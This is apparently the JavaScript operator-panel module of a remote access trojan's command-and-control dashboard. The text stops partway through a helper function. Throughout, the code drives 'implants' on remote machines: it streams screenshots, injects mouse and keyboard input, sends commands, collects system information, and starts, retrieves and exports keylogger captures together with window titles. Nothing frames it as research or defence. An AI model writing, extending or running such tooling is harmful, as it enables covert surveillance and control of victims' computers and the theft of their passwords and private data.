// Remote Control Module
const RemoteControlModule = {
    screenshotInterval: null,
    screenshotDelay: 500, // ms
    selectedImplant: null,
    isStreaming: false,
    isControlActive: false,
    lastMousePosition: { x: 0, y: 0 },
    scaleFactor: { x: 1, y: 1 },
    isEmergencyMode: false,
    active: false,
    connectionState: 'disconnected', // 'connected', 'disconnected', 'reconnecting'
    reconnectAttempts: 0,
    maxReconnectAttempts: 10,
    reconnectTimer: null,
    baseReconnectDelay: 1000, // ms
    lastConnectionTime: null,
    implantId: null,
    sessionKey: null,
    commandHistory: [],
    commandHistoryIndex: -1,
    initialized: false,
    initializationInProgress: false,
    initializationRetries: 0,
    maxInitializationRetries: 20,
    
    init(socket) {
        console.log(`RemoteControlModule.init called, initialized=${this.initialized}, initializationInProgress=${this.initializationInProgress}`);
        // Check if already initialized to prevent duplicate initialization
        if (this.initialized) {
            console.log('RemoteControlModule already initialized, skipping initialization');
            return;
        }
        
        // Set initialization flag to prevent concurrent initialization
        this.initializationInProgress = true;
        
        // Validate socket parameter
        if (!socket) {
            console.error('RemoteControlModule.init called with null/undefined socket');
            this.initializationInProgress = false;
            return;
        }
        
        // Clean up any existing resources before initialization
        this._cleanupResources();
        
        this.socket = socket;
        console.log('RemoteControlModule initialized with socket');
        
        // Initialize the socket and mark the module as initialized
        this.initialized = true;
        
        // Clean up any existing listeners before adding new ones
        this._cleanupEventListeners();
        console.log('RemoteControlModule initialized with socket');
        
        // Set up WebSocket event listeners first before updating state
        // This prevents race conditions with WebSocket events
        this.setupWebSocketEventListeners();
        
        // Initialize connection state
        this.updateConnectionState(
            socket && socket.readyState === WebSocket.OPEN ? 'connected' : 'disconnected'
        );
        
        // Set up UI event listeners after connection is established
        this.setupEventListeners();
        // Check if there's a stored implant selection in WebSocketManager or localStorage
        const storedImplantId = WebSocketManager?.selectedImplantId || localStorage.getItem('selectedImplantId');
        if (storedImplantId) {
            console.log(`RemoteControlModule: Restoring selected implant ${storedImplantId}`);
            this.selectImplant(storedImplantId);
            
            // Force UI update for remote control page if it's visible
            this.updateRemoteControlInterface();
            
            // Force system info update with a slight delay to ensure WebSocket is ready
            setTimeout(() => this.updateSystemInfo(), 500);
        }
        // Add listener for implant selection changes
        document.addEventListener('implant-selected', (event) => {
            if (event.detail && event.detail.implantId) {
                console.log(`RemoteControlModule: Received implant selection event for ${event.detail.implantId}`);
                this.selectImplant(event.detail.implantId);
                this.updateRemoteControlInterface();
            }
        });
        
        // Listen for sidebar navigation to ensure proper UI updates
        document.querySelectorAll('#sidebar a').forEach(link => {
            link.addEventListener('click', (e) => {
                if (link.getAttribute('href') === '#remote-control') {
                    console.log('RemoteControlModule: Remote control view activated');
                    // Short delay to let the DOM update first
                    setTimeout(() => this.updateRemoteControlInterface(), 100);
                }
            });
        });
        
        // Initialize emergency mode if set in storage
        if (localStorage.getItem('emergency_mode') === 'true') {
            this.enableEmergencyMode(true);
        }
        
        // Setup command history navigation
        const remoteCommandInput = document.getElementById('remote-command');
        if (remoteCommandInput) {
            remoteCommandInput.addEventListener('keydown', (event) => {
                if (event.key === 'ArrowUp') {
                    this.navigateCommandHistory('up');
                    event.preventDefault();
                } else if (event.key === 'ArrowDown') {
                    this.navigateCommandHistory('down');
                    event.preventDefault();
                }
            });
        } else {
            console.warn('Remote command input element not found during init');
        }
        
        // Initialize the module's UI elements
        this.setupUIListeners();
        this.initialized = true;
        console.log('RemoteControlModule initialized');
    },
    
    isAvailable() {
        if (!this.initialized) {
            console.warn('RemoteControlModule not fully initialized yet');
            try {
                // Only try to initialize if we have socket available
                if (window.WebSocketManager && WebSocketManager.socket) {
                    this.init(WebSocketManager.socket);
                    return this.initialized; // Return the actual state after initialization attempt
                } else {
                    console.log('WebSocketManager not available, cannot initialize RemoteControlModule');
                    
                    // Schedule a retry if WebSocketManager might become available later
                    if (!this._initRetryScheduled) {
                        this._initRetryScheduled = true;
                        setTimeout(() => {
                            this._initRetryScheduled = false;
                            if (window.WebSocketManager && WebSocketManager.socket) {
                                console.log('Retrying RemoteControlModule initialization after delay');
                                this.init(WebSocketManager.socket);
                            }
                        }, 1000);
                    }
                    
                    return false;
                }
            } catch (e) {
                console.error('Failed to initialize RemoteControlModule:', e);
                return false;
            }
        }
        return true;
    },
    
    setupUIListeners() {
        try {
            const sendBtn = document.getElementById('send-command-btn');
            if (sendBtn) {
                sendBtn.addEventListener('click', () => {
                    this.sendCommand();
                });
            } else {
                console.warn('Send command button not found during setupUIListeners');
            }
            
            const remoteCmd = document.getElementById('remote-command');
            if (remoteCmd) {
                remoteCmd.addEventListener('keydown', (event) => {
                    if (event.key === 'Enter' && !event.shiftKey) {
                        event.preventDefault();
                        this.sendCommand();
                    }
                });
            } else {
                console.warn('Remote command input not found during setupUIListeners');
            }
            
            const clearBtn = document.getElementById('clear-output-btn');
            if (clearBtn) {
                clearBtn.addEventListener('click', () => {
                    this.clearOutput();
                });
            } else {
                 console.warn('Clear output button not found during setupUIListeners');
            }
            
            const emergencyBtn = document.getElementById('emergency-mode-btn');
            if (emergencyBtn) {
                emergencyBtn.addEventListener('click', () => {
                    this.toggleEmergencyMode();
                });
            } else {
                console.warn('Emergency mode button not found during setupUIListeners');
            }
            
            // Add more UI listeners as needed (with checks)
        } catch (error) {
            console.error('Error setting up UI listeners:', error);
            // Don't throw - we want to allow partial initialization
        }
    },
    updateRemoteControlInterface() {
        console.log('RemoteControlModule: Updating remote control interface');
        
        // Check if the remote control view is currently visible
        const remoteControlSection = document.getElementById('remote-control');
        if (!remoteControlSection || remoteControlSection.classList.contains('d-none')) {
            console.log('RemoteControlModule: Remote control view is not visible, skipping update');
            return;
        }
        
        // Update the selected implant header
        const header = document.getElementById('selected-implant-header');
        if (header) {
            if (this.selectedImplant) {
                header.textContent = `Selected implant: ${this.selectedImplant}`;
                header.classList.remove('d-none');
                console.log(`RemoteControlModule: Updated header with implant ${this.selectedImplant}`);
            } else {
                header.textContent = 'No implant selected';
                header.classList.remove('d-none');
                console.log('RemoteControlModule: Updated header - no implant selected');
            }
        }
        
        // Force system info update if we have a selected implant
        if (this.selectedImplant) {
            console.log(`RemoteControlModule: Forcing system info update for ${this.selectedImplant}`);
            this.updateSystemInfo();
        }
    },
    
    setupEventListeners() {
        const startBtn = document.getElementById('start-stream');
        const stopBtn = document.getElementById('stop-stream');
        const singleBtn = document.getElementById('capture-screen');
        const sysInfoBtn = document.getElementById('refresh-system-info');
        const enableControlBtn = document.getElementById('enable-control');
        const disableControlBtn = document.getElementById('disable-control');
        
        // Keylogger buttons
        const startKeyloggerBtn = document.getElementById('start-keylogger');
        const stopKeyloggerBtn = document.getElementById('stop-keylogger');
        const getKeylogDataBtn = document.getElementById('get-keylog-data');
        
        if (startBtn) startBtn.addEventListener('click', this.startScreenStream.bind(this));
        if (stopBtn) stopBtn.addEventListener('click', this.stopScreenStream.bind(this));
        if (singleBtn) singleBtn.addEventListener('click', this.captureSingleScreenshot.bind(this));
        if (sysInfoBtn) sysInfoBtn.addEventListener('click', this.getSystemInfo.bind(this));
        if (enableControlBtn) enableControlBtn.addEventListener('click', this.enableRemoteControl.bind(this));
        if (disableControlBtn) disableControlBtn.addEventListener('click', this.disableRemoteControl.bind(this));
        
        // Add keylogger event listeners
        if (startKeyloggerBtn) startKeyloggerBtn.addEventListener('click', this.startKeylogger.bind(this));
        if (stopKeyloggerBtn) stopKeyloggerBtn.addEventListener('click', this.stopKeylogger.bind(this));
        if (getKeylogDataBtn) getKeylogDataBtn.addEventListener('click', this.getKeylogData.bind(this));
        
        // Setup screen capture element for mouse/keyboard events
        const screenCapture = document.getElementById('screen-capture');
        if (screenCapture) {
            // Mouse events
            screenCapture.addEventListener('click', this.handleMouseClick.bind(this));
            screenCapture.addEventListener('mousemove', this.handleMouseMove.bind(this));
            screenCapture.addEventListener('mousedown', this.handleMouseDown.bind(this));
            screenCapture.addEventListener('mouseup', this.handleMouseUp.bind(this));
            screenCapture.addEventListener('contextmenu', (e) => {
                if (this.isControlActive) {
                    e.preventDefault();
                    this.handleRightClick(e);
                }
            });
            
            // Make screen capture focusable to capture keyboard events
            screenCapture.tabIndex = 0;
            
            // Keyboard events
            screenCapture.addEventListener('keydown', this.handleKeyDown.bind(this));
            screenCapture.addEventListener('keyup', this.handleKeyUp.bind(this));
        }
        
        // Socket event listeners using custom events
        document.addEventListener('socket-message', (event) => {
            const data = event.detail;
            if (data.type === 'screenshot') {
                this.handleScreenCapture(data);
            }
            else if (data.type === 'system_info') {
                this.handleSystemInfo(data);
            }
            else if (data.type === 'control_status') {
                this.handleControlStatus(data);
            }
        });
    },
    
    selectImplant(implantId) {
        if (!this.isAvailable()) {
            console.error('RemoteControlModule not available when selecting implant');
            dashboard.showNotification('Remote control module not initialized properly. Check console for errors.', 'warning');
            return;
        }
        
        console.log(`RemoteControlModule: Setting selected implant to ${implantId}`);
        this.selectedImplant = implantId;
        
        // Store in localStorage for persistence
        localStorage.setItem('selectedImplantId', implantId);
        
        // Update the Connection UI to show "Connecting..." status
        const connectionText = document.getElementById('connection-text');
        if (connectionText) {
            connectionText.textContent = 'Connecting...';
            connectionText.className = 'text-warning';
        }
        
        // Force system info update with a slight delay
        setTimeout(() => this.updateSystemInfo(), 300);
        
        return implantId;
    },
    
    updateSystemInfo() {
        console.log('RemoteControlModule: Updating system info');
        if (!this.selectedImplant) {
            console.error('No implant selected for system info update');
            
            // Clear system info fields when no implant is selected
            const osInfo = document.getElementById('os-info');
            const ipInfo = document.getElementById('ip-info');
            const lastSeen = document.getElementById('last-seen');
            if (osInfo) osInfo.textContent = '-';
            if (ipInfo) ipInfo.textContent = '-';
            if (lastSeen) lastSeen.textContent = '-';
            
            return;
        }
        try {
            // Use the safeSend method to handle connection checks
            const sent = this.safeSend({
                type: 'get_system_info',
                implant_id: this.selectedImplant
            });
            
            if (sent) {
                console.log(`Sending system info request for implant ${this.selectedImplant}`);
                
                // Reset previous system info while waiting for new data
                const osInfo = document.getElementById('os-info');
                const ipInfo = document.getElementById('ip-info');
                if (osInfo) osInfo.textContent = 'Loading...';
                if (ipInfo) ipInfo.textContent = 'Loading...';
                
                // Also request a screenshot to show the user something is happening
                setTimeout(() => this.captureSingleScreenshot(), 200);
                
                console.log(`Requested system info for implant ${this.selectedImplant}`);
            } else {
                // Just log that the socket is not ready, don't add listeners here
                console.warn(`WebSocket not ready during updateSystemInfo for ${this.selectedImplant}. State: ${WebSocketManager?.socket?.readyState}`);
                // Optionally update UI elements to show 'disconnected' or 'waiting' state here
                const osInfo = document.getElementById('os-info');
                const ipInfo = document.getElementById('ip-info');
                if (osInfo) osInfo.textContent = 'Waiting for connection...';
                if (ipInfo) ipInfo.textContent = 'Waiting for connection...';
                
                // If in emergency mode, try to use HTTP fallback
                if (this.isEmergencyMode) {
                    console.log('Using HTTP fallback for system info in emergency mode');
                    this.getSystemInfoViaHttp(this.selectedImplant);
                }
            }
        } catch (error) {
            console.error('Error sending system info request:', error);
            dashboard.showNotification('Error requesting system information', 'danger');
            
            // Update UI to show error state
            const osInfo = document.getElementById('os-info');
            const ipInfo = document.getElementById('ip-info');
            if (osInfo) osInfo.textContent = 'Error loading data';
            if (ipInfo) ipInfo.textContent = 'Error loading data';
        }
    },
    startScreenStream() {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }
        
        // Clear any existing interval
        this.stopScreenStream();
        
        // Set streaming state
        this.isStreaming = true;
        
        // Calculate and send the desired scale factor to client
        const desiredScaleFactor = 0.5; // Default scale factor
        this.safeSend({
            type: 'command',
            command: 'set_scale_factor',
            implant_id: this.selectedImplant,
            scale_factor: desiredScaleFactor
        });
        
        // Start new capture interval
        this.screenshotInterval = setInterval(() => {
            this.safeSend({
                type: 'capture_screen',
                implant_id: this.selectedImplant
            });
        }, this.screenshotDelay);
        
        // Update UI
        const startBtn = document.getElementById('start-stream');
        const stopBtn = document.getElementById('stop-stream');
        if (startBtn) startBtn.disabled = true;
        if (stopBtn) stopBtn.disabled = false;
        
        // Enable control buttons
        const enableControlBtn = document.getElementById('enable-control');
        if (enableControlBtn) enableControlBtn.disabled = false;
        
        dashboard.showNotification('Screen streaming started', 'success');
    },
    
    stopScreenStream() {
        try {
            console.log('Stopping screen stream');
            
            // Clear the interval whether it exists or not
            if (this.screenshotInterval) {
                clearInterval(this.screenshotInterval);
                this.screenshotInterval = null;
            }
            
            // Update streaming state
            this.isStreaming = false;
            
            try {
                // Safely disable remote control
                if (this.isControlActive) {
                    this.disableRemoteControl();
                }
            } catch (controlError) {
                console.error('Error disabling remote control:', controlError);
            }
            
            try {
                // Update UI
                const startBtn = document.getElementById('start-stream');
                const stopBtn = document.getElementById('stop-stream');
                if (startBtn) startBtn.disabled = false;
                if (stopBtn) stopBtn.disabled = true;
                
                // Disable control buttons
                const enableControlBtn = document.getElementById('enable-control');
                const disableControlBtn = document.getElementById('disable-control');
                if (enableControlBtn) enableControlBtn.disabled = true;
                if (disableControlBtn) disableControlBtn.disabled = true;
                
                // Cleanup any UI elements related to streaming
                const reconnecting = document.querySelector('.reconnecting-indicator');
                if (reconnecting) {
                    reconnecting.remove();
                }
                
                // Show "no screenshot available" message
                const noScreenshotDiv = document.querySelector('.no-screenshot');
                if (noScreenshotDiv) {
                    noScreenshotDiv.style.display = 'block';
                }
            } catch (uiError) {
                console.error('Error updating UI in stopScreenStream:', uiError);
            }
            
            // Clear any pending WebSocket messages
            if (this.pendingScreenshotRequest) {
                clearTimeout(this.pendingScreenshotRequest);
                this.pendingScreenshotRequest = null;
            }
            
            // Only show notification if dashboard exists
            if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
                dashboard.showNotification('Screen streaming stopped', 'info');
            }
        } catch (error) {
            console.error('Error in stopScreenStream:', error);
        }
    },
    
    captureSingleScreenshot() {
        const implantId = this.selectedImplant;
        if (!implantId) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }
        
        // Use WebSocket if available and not in emergency mode
        // Use safeSend which will handle connection checks and fallbacks
        const sent = this.safeSend({
            type: 'capture_screen',
            implant_id: implantId
        });
        
        if (sent) {
            dashboard.showNotification('Requesting screenshot...', 'info');
        } else if (this.isEmergencyMode) {
            // Use HTTP fallback in emergency mode
            console.log('Using HTTP fallback for screenshot in emergency mode');
            this.captureScreenshotViaHttp(implantId);
        } else {
            dashboard.showNotification('Connection issue. Try enabling Emergency Mode.', 'error');
        }
    },
    getSystemInfo() {
        const implantId = this.selectedImplant;
        if (!implantId) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }
        
        const sent = this.safeSend({
            type: 'get_system_info',
            implant_id: implantId
        });
        
        if (sent) {
            dashboard.showNotification('Requesting system information...', 'info');
        } else {
            dashboard.showNotification('Connection issue detected', 'error');
        }
    },
    
    enableRemoteControl() {
        if (!this.isStreaming) {
            dashboard.showNotification('Please start screen streaming first', 'warning');
            return;
        }
        
        this.isControlActive = true;
        
        // Update UI
        const enableControlBtn = document.getElementById('enable-control');
        const disableControlBtn = document.getElementById('disable-control');
        if (enableControlBtn) enableControlBtn.disabled = true;
        if (disableControlBtn) disableControlBtn.disabled = false;
        
        // Set focus to the screen capture element to capture keyboard events
        const screenCapture = document.getElementById('screen-capture');
        if (screenCapture) {
            screenCapture.focus();
            screenCapture.classList.add('control-active');
        }
        
        if (WebSocketManager && WebSocketManager.socket && WebSocketManager.socket.readyState === WebSocket.OPEN) {
            WebSocketManager.send({
                type: 'command',
                command: 'enable_remote_control',
                implant_id: this.selectedImplant
            });
        }
        
        dashboard.showNotification('Remote control enabled - You can now use mouse and keyboard', 'success');
    },
    
    disableRemoteControl() {
        this.isControlActive = false;
        
        // Update UI
        const enableControlBtn = document.getElementById('enable-control');
        const disableControlBtn = document.getElementById('disable-control');
        if (enableControlBtn) enableControlBtn.disabled = this.isStreaming ? false : true;
        if (disableControlBtn) disableControlBtn.disabled = true;
        
        // Remove focus from screen capture
        const screenCapture = document.getElementById('screen-capture');
        if (screenCapture) {
            screenCapture.blur();
            screenCapture.classList.remove('control-active');
        }
        
        if (WebSocketManager && WebSocketManager.socket && WebSocketManager.socket.readyState === WebSocket.OPEN) {
            WebSocketManager.send({
                type: 'command',
                command: 'disable_remote_control',
                implant_id: this.selectedImplant
            });
        }
        
        dashboard.showNotification('Remote control disabled', 'info');
    },
    
    calculateMousePosition(e) {
        if (!e) return { x: 0, y: 0 };
        
        const screenCapture = document.getElementById('screen-capture');
        if (!screenCapture) return { x: 0, y: 0 };
        
        const rect = screenCapture.getBoundingClientRect();
        const x = Math.round((e.clientX - rect.left) * this.scaleFactor.x);
        const y = Math.round((e.clientY - rect.top) * this.scaleFactor.y);
        
        return { x, y };
    },
    
    handleMouseMove(e) {
        if (!this.isControlActive) return;
        
        const pos = this.calculateMousePosition(e);
        this.lastMousePosition = pos;
        
        if (WebSocketManager && WebSocketManager.socket && WebSocketManager.socket.readyState === WebSocket.OPEN) {
            WebSocketManager.send({
                type: 'control',
                command: 'mouse_move',
                implant_id: this.selectedImplant,
                x: pos.x,
                y: pos.y
            });
        }
    },
    
    handleMouseDown(e) {
        if (!this.isControlActive) return;
        e.preventDefault();
        
        const pos = this.calculateMousePosition(e);
        const button = e.button; // 0: left, 1: middle, 2: right
        
        if (WebSocketManager && WebSocketManager.socket && WebSocketManager.socket.readyState === WebSocket.OPEN) {
            WebSocketManager.send({
                type: 'control',
                command: 'mouse_down',
                implant_id: this.selectedImplant,
                x: pos.x,
                y: pos.y,
                button: button
            });
        }
    },
    
    handleMouseUp(e) {
        if (!this.isControlActive) return;
        e.preventDefault();
        
        const pos = this.calculateMousePosition(e);
        const button = e.button; // 0: left, 1: middle, 2: right
        
        if (WebSocketManager && WebSocketManager.socket && WebSocketManager.socket.readyState === WebSocket.OPEN) {
            WebSocketManager.send({
                type: 'control',
                command: 'mouse_up',
                implant_id: this.selectedImplant,
                x: pos.x,
                y: pos.y,
                button: button
            });
        }
    },
    
    handleMouseClick(e) {
        if (!this.isControlActive) return;
        e.preventDefault();
        
        const pos = this.calculateMousePosition(e);
        const button = e.button; // 0: left, 1: middle, 2: right
        
        if (WebSocketManager && WebSocketManager.socket && WebSocketManager.socket.readyState === WebSocket.OPEN) {
            WebSocketManager.send({
                type: 'control',
                command: 'mouse_click',
                implant_id: this.selectedImplant,
                x: pos.x,
                y: pos.y,
                button: button
            });
        }
    },
    
    handleRightClick(e) {
        if (!this.isControlActive) return;
        e.preventDefault();
        
        const pos = this.calculateMousePosition(e);
        
        if (WebSocketManager && WebSocketManager.socket && WebSocketManager.socket.readyState === WebSocket.OPEN) {
            WebSocketManager.send({
                type: 'control',
                command: 'right_click',
                implant_id: this.selectedImplant,
                x: pos.x,
                y: pos.y
            });
        }
    },
    
    handleKeyDown(e) {
        if (!this.isControlActive) return;
        
        // Don't capture browser shortcuts
        if ((e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.key === 'F5')) {
            return; // Allow browser refresh
        }
        
        e.preventDefault();
        
        const keyData = {
            key: e.key,
            keyCode: e.keyCode,
            code: e.code,
            altKey: e.altKey,
            ctrlKey: e.ctrlKey,
            shiftKey: e.shiftKey,
            metaKey: e.metaKey
        };
        
        if (WebSocketManager && WebSocketManager.socket && WebSocketManager.socket.readyState === WebSocket.OPEN) {
            WebSocketManager.send({
                type: 'control',
                command: 'key_down',
                implant_id: this.selectedImplant,
                key_data: keyData
            });
        }
    },
    
    handleKeyUp(e) {
        if (!this.isControlActive) return;
        e.preventDefault();
        
        const keyData = {
            key: e.key,
            keyCode: e.keyCode,
            code: e.code,
            altKey: e.altKey,
            ctrlKey: e.ctrlKey,
            shiftKey: e.shiftKey,
            metaKey: e.metaKey
        };
        
        if (WebSocketManager && WebSocketManager.socket && WebSocketManager.socket.readyState === WebSocket.OPEN) {
            WebSocketManager.send({
                type: 'control',
                command: 'key_up',
                implant_id: this.selectedImplant,
                key_data: keyData
            });
        }
    },
    
    handleControlStatus(data) {
        if (data.success) {
            console.log('Remote control status updated:', data.status);
        } else {
            console.error('Failed to update remote control status:', data.error);
            dashboard.showNotification(`Remote control error: ${data.error}`, 'danger');
            
            // If failed, reset the control UI
            this.isControlActive = false;
            const enableControlBtn = document.getElementById('enable-control');
            const disableControlBtn = document.getElementById('disable-control');
            if (enableControlBtn) enableControlBtn.disabled = false;
            if (disableControlBtn) disableControlBtn.disabled = true;
        }
    },
    
    handleMouseActionResult(data) {
        if (!data.success) {
            console.error('Failed to execute mouse action:', data.error);
            // Only show notification for serious errors to avoid flooding
            if (data.error !== 'Connection lost' && data.error !== 'Timeout') {
                dashboard.showNotification(`Mouse action error: ${data.error}`, 'danger');
            }
        } else if (data.details) {
            console.log('Mouse action details:', data.details);
        }
    },
    
    handleKeyboardActionResult(data) {
        if (!data.success) {
            console.error('Failed to execute keyboard action:', data.error);
            // Only show notification for serious errors to avoid flooding
            if (data.error !== 'Connection lost' && data.error !== 'Timeout') {
                dashboard.showNotification(`Keyboard action error: ${data.error}`, 'danger');
            }
        } else if (data.details) {
            console.log('Keyboard action details:', data.details);
        }
    },
    
    handleScreenCapture(data) {
        console.log('RemoteControlModule: Received screen capture');
        if (!data.data || !data.data.image_data) {
            console.error('Invalid screen capture data');
            return;
        }
        
        // Get the image element
        const img = document.getElementById('screen-capture');
        if (!img) {
            console.error('Screen capture image element not found');
            return;
        }
        
        // Set image source
        img.src = `data:image/${data.data.format || 'jpeg'};base64,${data.data.image_data}`;
        
        // Show the image, hide the "no screenshot" message
        img.classList.remove('d-none');
        const noScreenshotDiv = document.querySelector('.no-screenshot');
        if (noScreenshotDiv) {
            noScreenshotDiv.style.display = 'none';
        }
        
        // Calculate scale factors for mouse positions
        const originalWidth = data.data.original_width || 1920; 
        const originalHeight = data.data.original_height || 1080;
        this.scaleFactor.x = originalWidth / img.clientWidth;
        this.scaleFactor.y = originalHeight / img.clientHeight;
    },
    
    // Add a method specifically for system metrics that's referenced in WebSocketManager
    updateSystemMetrics(data) {
        console.log('Updating system metrics:', data);
        const osInfo = document.getElementById('os-info');
        const ipInfo = document.getElementById('ip-info');
        const lastSeen = document.getElementById('last-seen');
        const cpuUsage = document.getElementById('cpu-usage');
        const memoryUsage = document.getElementById('memory-usage');
        
        if (osInfo && data.os) osInfo.textContent = data.os;
        if (ipInfo && data.ip) ipInfo.textContent = data.ip;
        if (lastSeen && data.last_seen) lastSeen.textContent = new Date(data.last_seen).toLocaleString();
        if (cpuUsage && data.cpu) cpuUsage.textContent = `${data.cpu}%`;
        if (memoryUsage && data.memory) memoryUsage.textContent = `${data.memory}%`;
    },
    
    handleSystemInfo(data) {
        console.log('RemoteControlModule: Received system info', data);
        
        // Update the system info in the UI
        const osInfo = document.getElementById('os-info');
        const ipInfo = document.getElementById('ip-info');
        const lastSeen = document.getElementById('last-seen');
        const cpuUsageBar = document.getElementById('cpu-usage-bar');
        const memoryUsageBar = document.getElementById('memory-usage-bar');
        const connectionText = document.getElementById('connection-text');
        const connectionLatency = document.getElementById('connection-latency');
        const connectionTime = document.getElementById('connection-time');
        
        if (data.data) {
            // Update text fields
            if (osInfo) osInfo.textContent = data.data.platform || '-';
            if (ipInfo) ipInfo.textContent = data.data.ip || '-';
            
            // Format last seen date
            if (lastSeen && data.data.timestamp) {
                const date = new Date(data.data.timestamp);
                lastSeen.textContent = date.toLocaleString();
            }
            
            // Update progress bars
            if (cpuUsageBar && data.data.cpu_usage !== undefined) {
                const cpuUsage = Math.round(data.data.cpu_usage);
                cpuUsageBar.style.width = `${cpuUsage}%`;
                cpuUsageBar.textContent = `${cpuUsage}%`;
                cpuUsageBar.setAttribute('aria-valuenow', cpuUsage);
                
                // Update color based on usage
                cpuUsageBar.className = 'progress-bar';
                if (cpuUsage > 80) {
                    cpuUsageBar.classList.add('bg-danger');
                } else if (cpuUsage > 60) {
                    cpuUsageBar.classList.add('bg-warning');
                } else {
                    cpuUsageBar.classList.add('bg-success');
                }
            }
            
            if (memoryUsageBar && data.data.memory_percent !== undefined) {
                const memUsage = Math.round(data.data.memory_percent);
                memoryUsageBar.style.width = `${memUsage}%`;
                memoryUsageBar.textContent = `${memUsage}%`;
                memoryUsageBar.setAttribute('aria-valuenow', memUsage);
                
                // Update color based on usage
                memoryUsageBar.className = 'progress-bar';
                if (memUsage > 80) {
                    memoryUsageBar.classList.add('bg-danger');
                } else if (memUsage > 60) {
                    memoryUsageBar.classList.add('bg-warning');
                } else {
                    memoryUsageBar.classList.add('bg-success');
                }
            }
            
            // Update connection info
            if (connectionText) {
                connectionText.textContent = 'Connected';
                connectionText.classList.add('text-success');
            }
            
            if (connectionLatency) {
                connectionLatency.textContent = '~50ms'; // Placeholder, would need actual measurement
            }
            
            if (connectionTime) {
                connectionTime.textContent = new Date().toLocaleString();
            }
            
            // Update connection indicator
            const indicator = document.querySelector('.connection-indicator');
            if (indicator) {
                indicator.classList.add('connected');
            }
            
            dashboard.showNotification('System information updated', 'success');
        }
    },
    
    // Keylogger Functions
    startKeylogger() {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }
        
        if (WebSocketManager && WebSocketManager.socket && WebSocketManager.socket.readyState === WebSocket.OPEN) {
            WebSocketManager.send({
                type: 'start_keylogger',
                implant_id: this.selectedImplant
            });
            
            // Update UI
            const startBtn = document.getElementById('start-keylogger');
            const stopBtn = document.getElementById('stop-keylogger');
            const retrieveBtn = document.getElementById('get-keylog-data');
            
            if (startBtn) startBtn.disabled = true;
            if (stopBtn) stopBtn.disabled = false;
            if (retrieveBtn) retrieveBtn.disabled = false;
            
            dashboard.showNotification('Keylogger started', 'success');
        }
    },
    
    stopKeylogger() {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }
        
        if (WebSocketManager && WebSocketManager.socket && WebSocketManager.socket.readyState === WebSocket.OPEN) {
            WebSocketManager.send({
                type: 'stop_keylogger',
                implant_id: this.selectedImplant
            });
            
            // Update UI
            const startBtn = document.getElementById('start-keylogger');
            const stopBtn = document.getElementById('stop-keylogger');
            
            if (startBtn) startBtn.disabled = false;
            if (stopBtn) stopBtn.disabled = true;
            
            dashboard.showNotification('Keylogger stopped', 'success');
        }
    },
    
    getKeylogData() {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }
        
        if (WebSocketManager && WebSocketManager.socket && WebSocketManager.socket.readyState === WebSocket.OPEN) {
            WebSocketManager.send({
                type: 'get_keylog_data',
                implant_id: this.selectedImplant
            });
            
            dashboard.showNotification('Retrieving keylog data...', 'info');
        }
    },
    
    handleKeyloggerStatus(data) {
        if (data.success) {
            console.log('Keylogger status updated:', data.status);
            dashboard.showNotification(`Keylogger ${data.status}`, 'success');
        } else {
            console.error('Failed to update keylogger status:', data.error);
            dashboard.showNotification(`Keylogger error: ${data.error}`, 'danger');
            
            // Reset UI
            const startBtn = document.getElementById('start-keylogger');
            const stopBtn = document.getElementById('stop-keylogger');
            
            if (startBtn) startBtn.disabled = false;
            if (stopBtn) stopBtn.disabled = true;
        }
    },
    
    handleKeyloggerData(data) {
        if (!data.entries || data.entries.length === 0) {
            dashboard.showNotification('No keylog data available', 'info');
            return;
        }
        
        // Display data in modal
        this.showKeylogDataModal(data.entries);
    },
    
    showKeylogDataModal(entries) {
        // Create modal if it doesn't exist
        let modalEl = document.getElementById('keylog-data-modal');
        if (!modalEl) {
            modalEl = document.createElement('div');
            modalEl.id = 'keylog-data-modal';
            modalEl.className = 'modal fade';
            modalEl.tabIndex = -1;
            modalEl.setAttribute('aria-labelledby', 'keylogDataModalLabel');
            modalEl.setAttribute('aria-hidden', 'true');
            
            modalEl.innerHTML = `
                <div class="modal-dialog modal-lg">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" id="keylogDataModalLabel">Keylogger Data</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <div class="mb-3">
                                <button id="export-keylog-csv" class="btn btn-sm btn-primary">Export as CSV</button>
                                <button id="export-keylog-json" class="btn btn-sm btn-secondary">Export as JSON</button>
                                <button id="clear-keylog-data" class="btn btn-sm btn-danger float-end">Clear Data</button>
                            </div>
                            <div class="table-responsive">
                                <table class="table table-sm table-striped" id="keylog-data-table">
                                    <thead>
                                        <tr>
                                            <th>Timestamp</th>
                                            <th>Window</th>
                                            <th>Key</th>
                                        </tr>
                                    </thead>
                                    <tbody id="keylog-data-tbody"></tbody>
                                </table>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        </div>
                    </div>
                </div>
            `;
            
            document.body.appendChild(modalEl);
            
            // Add export functionality
            document.getElementById('export-keylog-csv').addEventListener('click', () => {
                this.exportKeylogData('csv');
            });
            
            document.getElementById('export-keylog-json').addEventListener('click', () => {
                this.exportKeylogData('json');
            });
            
            document.getElementById('clear-keylog-data').addEventListener('click', () => {
                this.clearKeylogData();
            });
        }
        
        // Populate table
        const tbody = document.getElementById('keylog-data-tbody');
        tbody.innerHTML = '';
        
        // Store data for export
        this.keylogEntries = entries;
        
        // Add table rows
        for (const entry of entries) {
            const row = document.createElement('tr');
            
            // Format timestamp
            let timestamp = entry.timestamp;
            try {
                const date = new Date(entry.timestamp);
                timestamp = date.toLocaleString();
            } catch (e) {
                console.error('Error formatting timestamp:', e);
            }
            
            row.innerHTML = `
                <td>${timestamp}</td>
                <td>${this.escapeHtml(entry.window || '')}</td>
                <td>${this.escapeHtml(entry.key || '')}</td>
            `;
            
            tbody.appendChild(row);
        }
        
        // Show modal
        const modal = new bootstrap.Modal(modalEl);
        modal.show();
    },
    
    escapeHtml(text) {
        const map = {
            '&': '&amp;',
